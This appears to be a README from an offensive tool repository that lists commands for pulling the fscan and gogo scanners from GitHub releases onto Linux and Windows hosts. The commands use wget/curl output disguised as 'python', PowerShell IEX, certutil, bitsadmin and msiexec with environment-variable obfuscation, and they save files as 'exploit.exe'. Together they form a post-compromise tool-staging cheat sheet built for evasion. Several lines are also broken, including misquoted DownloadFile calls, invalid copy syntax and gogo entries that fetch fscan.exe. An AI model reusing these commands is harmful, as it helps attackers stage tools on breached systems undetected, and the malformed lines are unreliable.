# heixiongT00ls

## fscan
Linux amd
```
64
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan -O python

32
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32 -O python
```


Linux arm
```
64
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64 -O python

32
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6 -O python
```


Windows 
```
64
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe', exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe

32
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe -OutFile exploit.exe', exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe -OutFile exploit.exe exploit.exe
copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe -OutFile exploit.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe
```


Windows arm

```
64
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe -OutFile exploit.exe', exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe -OutFile exploit.exe exploit.exe
copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe -OutFile exploit.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe

32
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe -OutFile exploit.exe', exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe -OutFile exploit.exe exploit.exe
copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe -OutFile exploit.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe
```

Windows 2003

```
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe -OutFile exploit.exe', exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe -OutFile exploit.exe exploit.exe
copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe -OutFile exploit.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe

upx
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe -OutFile exploit.exe', exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe -OutFile exploit.exe exploit.exe
copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe -OutFile exploit.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe
```

## gogo
Linux amd

```
64
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_amd64 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_amd64 -O python

32
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_386 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_386 -O python
```


Linux arm

```
64
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_arm64 -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_arm64 -O python

32
wget https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_arm -O python
curl https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_linux_arm -O python
```


Windows amd

```
64
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe -OutFile exploit.exe', exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe -OutFile exploit.exe exploit.exe
copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe

32
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe -OutFile exploit.exe', exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe -OutFile exploit.exe exploit.exe
copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe
```


Windows arm
```
64
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe -OutFile exploit.exe', exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe -OutFile exploit.exe exploit.exe
copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe

32
64
powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe -OutFile exploit.exe"
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe -OutFile exploit.exe', exploit.exe)"
certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe -OutFile exploit.exe exploit.exe
copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe" c:\\exploit.exe
msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe
msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe
```



